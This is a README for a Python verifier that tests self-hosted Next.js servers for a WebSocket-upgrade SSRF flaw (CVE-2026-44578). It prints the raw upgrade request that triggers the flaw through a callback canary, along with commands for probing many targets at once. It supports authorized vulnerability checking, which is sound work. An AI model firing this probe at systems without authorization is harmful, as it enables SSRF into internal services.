# verify-ghsa-c4j6-fc7j-m34r

OOB verifier for **GHSA-c4j6-fc7j-m34r** / **CVE-2026-44578** — Server-Side Request
Forgery in Next.js via WebSocket upgrade requests.

> ⚠️ For authorized security testing only. You are responsible for ensuring you
> have permission to test every target you pass to this script.

## The vulnerability

Self-hosted Next.js applications running the built-in Node.js server (`next start`)
accept HTTP/1.1 `Upgrade` requests whose request-URI is an absolute URL. In
affected versions, the router proxied the upgrade to that absolute URL without
verifying that the destination corresponded to a safe external rewrite — the
same validation that gates normal HTTP rewrites was missing for upgrades.

An unauthenticated remote attacker can therefore coerce the server into proxying
WebSocket upgrades to arbitrary destinations (cloud metadata endpoints, internal
services, etc.), leaking responses back through the same socket.

| Field | Value |
|---|---|
| CVE | CVE-2026-44578 |
| GHSA | [GHSA-c4j6-fc7j-m34r](https://github.com/advisories/GHSA-c4j6-fc7j-m34r) |
| CWE | CWE-918 (SSRF) |
| CVSS v3.1 | 8.6 (High) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Affected | `next >=13.4.13 <15.5.16`, `>=16.0.0 <16.2.5` |
| Patched | `15.5.16`, `16.2.5` |
| Fix commit | [`c4f69086`](https://github.com/vercel/next.js/commit/c4f69086cc8dcbd81b1dbc321c98ea874d90d6f8) |
| Not affected | Vercel-hosted apps; `output: "export"`; deployments behind a reverse proxy that does not forward `Upgrade` |

## How the verifier works

For each target it opens a raw TCP (or TLS) socket and sends an HTTP/1.1 upgrade
with an absolute request-URI pointing at a callback host you control. Each
target gets a unique token in the callback path.

```
GET <your-canary>/<token> HTTP/1.1
Host: <target>
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

If your canary receives an inbound HTTP request containing one of the tokens,
the corresponding target proxied the upgrade — i.e. it is vulnerable.

You provide the canary. Anything that logs inbound HTTP requests works:
`python3 -m http.server`, an nginx access log, a Burp Collaborator instance,
an interactsh server, a webhook.site URL, etc.

## Requirements

- Python 3.10+
- No third-party dependencies (stdlib only)

## Usage

```bash
# multi-target from a file
python3 verify_ghsa_c4j6.py \
    --canary https://my-canary.example.com/probe \
    --targets-file targets.txt

# multi-target by repeating --target
python3 verify_ghsa_c4j6.py \
    --canary https://my-canary.example.com/probe \
    --target https://app1.example.com \
    --target app2.example.com:3000 \
    --target 10.0.0.5:80

# targets piped on stdin
cat targets.txt | python3 verify_ghsa_c4j6.py --canary https://my-canary.example.com/probe

# JSON-Lines output for downstream tooling
python3 verify_ghsa_c4j6.py --canary ... --targets-file targets.txt --json
```

### Flags

| Flag | Description | Default |
|---|---|---|
| `--canary URL` | Callback base URL you control. Required. | — |
| `--target URL` | A single target. Repeat for multiple. | — |
| `--targets-file PATH` | File with one target per line (`#` comments allowed). | — |
| `--timeout SEC` | Per-socket timeout. | `5` |
| `--concurrency N` | Parallel probes. | `10` |
| `--insecure` | Skip TLS certificate verification. | off |
| `--json` | Emit JSON Lines instead of human text. | off |

Targets may be `host`, `host:port`, or full `http(s)://...` URLs.

## Interpreting results

After running, the script prints a comma-separated list of tokens it sent.
Grep your canary's access log:

```bash
grep -E '<token1>|<token2>|<token3>' /var/log/nginx/access.log
```

- **Hit found** → that target is vulnerable to GHSA-c4j6-fc7j-m34r.
- **No hit, payload sent successfully** → most likely patched, behind a reverse
  proxy that strips `Upgrade`, on Vercel, or has egress filtering blocking
  outbound traffic to your canary. Inconclusive but suggestive of "not directly
  exploitable from here".
- **`connect_error`** → couldn't reach the target. Not a result.

### False positives / negatives

- **False positives** are rare. Receiving a callback requires the server to
  have actually proxied the request. To rule out a different SSRF (not this
  CVE), re-fire the same payload without the `Connection: Upgrade` and
  `Upgrade: websocket` headers. If you still get a callback, the SSRF is
  elsewhere.
- **False negatives** are possible whenever something between you and Next
  swallows the `Upgrade` (Cloudflare with WebSockets disabled, an nginx
  config that doesn't forward `Upgrade`, an AWS ALB without WebSocket support,
  etc.). The target may still be vulnerable if reached directly.

## Responsible use

Test only systems you own or have explicit, written authorization to assess.
The token-and-callback design intentionally avoids reading sensitive endpoints
(cloud metadata, internal admin panels) directly — you only learn that the
server proxied the request, not its contents. Stay on the safe side.

## References

- Advisory: <https://github.com/advisories/GHSA-c4j6-fc7j-m34r>
- Next.js v15.5.16 release: <https://github.com/vercel/next.js/releases/tag/v15.5.16>
- Next.js v16.2.5 release: <https://github.com/vercel/next.js/releases/tag/v16.2.5>
- Fix commit: <https://github.com/vercel/next.js/commit/c4f69086cc8dcbd81b1dbc321c98ea874d90d6f8>

## License

MIT
